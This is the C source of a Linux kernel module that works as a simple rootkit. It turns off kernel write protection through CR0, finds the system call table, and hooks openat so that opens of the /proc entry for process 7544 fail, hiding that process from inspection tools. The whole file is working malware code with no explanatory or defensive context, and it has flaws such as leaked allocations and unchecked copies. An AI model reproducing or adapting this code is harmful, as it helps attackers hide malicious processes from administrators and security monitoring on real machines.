#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <stdbool.h>

// Function prototypes
void initialize_path_to_hide(void);

// Types & other consts.
typedef int (*original_openat_t)(const struct pt_regs *regs);
static original_openat_t original_openat_ptr;
static unsigned long *syscall_table; 
static char pid_to_hide[] = "7544";
static char *path_to_hide;
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

int new_openat(const struct pt_regs *regs) {
    void *path_name_pointer = (void *)regs->si;
    char *path;
    path = kmalloc(PATH_MAX, GFP_KERNEL);
    copy_from_user((void *)path, path_name_pointer, PATH_MAX);

    // If the target is inside the path we're trying to hide, return an error.
    if (strstr(path, path_to_hide) != NULL) {
        return -1;
    }

    return original_openat_ptr(regs);
}
 
void initialize_path_to_hide(void) {
    char proc_path[] = "/proc/";

    // + 1 for the null terminator at the end of the string.
    int path_to_hide_len = strlen(pid_to_hide) + strlen(proc_path) + 1;
    path_to_hide = kmalloc(path_to_hide_len, GFP_KERNEL);
    sprintf(path_to_hide, "%s%s", proc_path, pid_to_hide);
}

int load(void) {
    printk(KERN_ALERT "Initializing...");
    initialize_path_to_hide();

    zero_cr0();
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    original_openat_ptr = (original_openat_t)syscall_table[__NR_openat];
    syscall_table[__NR_openat] = (unsigned long)new_openat;
    printk(KERN_ALERT "Overrided openat ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_openat] = (unsigned long)original_openat_ptr;  
    printk(KERN_ALERT "openat has been restored!");
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");